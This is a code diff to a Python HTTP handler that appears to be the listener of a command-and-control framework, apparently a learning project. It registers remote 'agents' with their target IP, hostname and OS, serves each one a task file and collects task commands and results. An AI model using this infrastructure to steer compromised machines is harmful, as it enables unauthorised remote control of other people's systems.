@@ -3,6 +3,7 @@
 from .agent import Agent
 import cgi
 from uuid import uuid4
+from .agents_helpers import add_agent
 
 def register_agent(self):
     self.send_response(200)
@@ -38,21 +39,25 @@ def register_agent(self):
     if ctype == 'multipart/form-data':
         # This reads each part of the form
         fields = cgi.parse_multipart(self.rfile, pdict)
-        # Grab the "task" field that was input by the post request.
+        # Grab the "task" field that was input by the post request.\
         uuid = uuid4()
+        
+        print(f"uuid type is {type(uuid)}")
         # uuid = "uuid"
-        tgt_ip = self.client_address
+        ip_port = self.client_address
+        (tgt_ip, tgt_port) = ip_port
         tgt_hostname = fields.get('hostname')
         tgt_os = fields.get('os type')
         tgt_os_version = fields.get('os version')
-        # print(f"$$Agent UUID:          {uuid}")
-        # print(f"$$Target IP Address:   {tgt_ip}")
-        # print(f"$$Target Hostname:     {tgt_hostname}")
-        # print(f"$$Target OS:           {tgt_os}")
-        # print(f"$$Target OS Version:   {tgt_os_version}\n")
-        new_agent = Agent(self.listener.name, uuid, tgt_ip, tgt_hostname, tgt_os, tgt_os_version)
+        print(f"Agent UUID:          {uuid}")
+        print(f"Target IP Address:   {tgt_ip}")
+        print(f"Target Hostname:     {tgt_hostname}")
+        print(f"Target OS:           {tgt_os}")
+        print(f"Target OS Version:   {tgt_os_version}\n")
+        new_agent = Agent(self.listener.name, str(uuid), tgt_ip, tgt_hostname[0], tgt_os[0], tgt_os_version[0])
+        add_agent(new_agent)
 
-        self.listener.agents[uuid] = new_agent
+        # self.listener.agents[uuid] = new_agent
 
         # for key, value in self.listener.agents.items():
         #     print(f"$$UUID: {key}\n Listener name: {value.listener_name}\n")
@@ -86,6 +91,8 @@ def collect_results(self):
     output += '<form method="POST" enctype="multipart/form-data" action="/reg">'
     output += '<input name="task id" type="text" placeholder="Task ID">'
     output += '<input type="submit" value="Add">'
+    output += '<input name="task cmd" type="text" placeholder="Task cmd">'
+    output += '<input type="submit" value="Add">'
     output += '<input name="task results" type="text" placeholder="Task Results">'
     output += '<input type="submit" value="Add">'
     output += '</form>'
@@ -106,9 +113,11 @@ def collect_results(self):
         fields = cgi.parse_multipart(self.rfile, pdict)
         # Grab the "task" field that was input by the post request.
         task_id = fields.get('task id')
+        task_cmd = fields.get('task cmd')
         task_results = fields.get('task results')
-        print(f"$$Task ID:             {task_id}")
-        print(f"$$Task Results:        {task_results}")
+        print(f"Task ID:             {task_id}")
+        print(f"Task Cmd:             {task_cmd}")
+        print(f"Task Results:        {task_results}")
         # Come back to this later to add to dict ******************************************
         # tasklist.append(new_task[0])
 
@@ -121,17 +130,14 @@ def collect_results(self):
         self.end_headers()
 
 
-def serve_tasks(self):
+def serve_tasks(self, agent):
     self.send_response(200)
     self.send_header('Content-type', 'text/html')
     self.send_header('Content-Disposition', 'attachment; filename="tasks.txt"')
     self.end_headers()
 
     # Make this a relative path.
-    with open('/home/jonathan/oopythonlabs/red_alert/data/tasks.txt', 'rb') as file: 
+    with open(agent.tasks_path, 'rb') as file:
         self.wfile.write(file.read())
 
-def get_agent_uuid(self):
-    for key, value in self.listener.agents.items():
-        # print("$$Agent UUID from dict is:\n", key)
-        return key
+
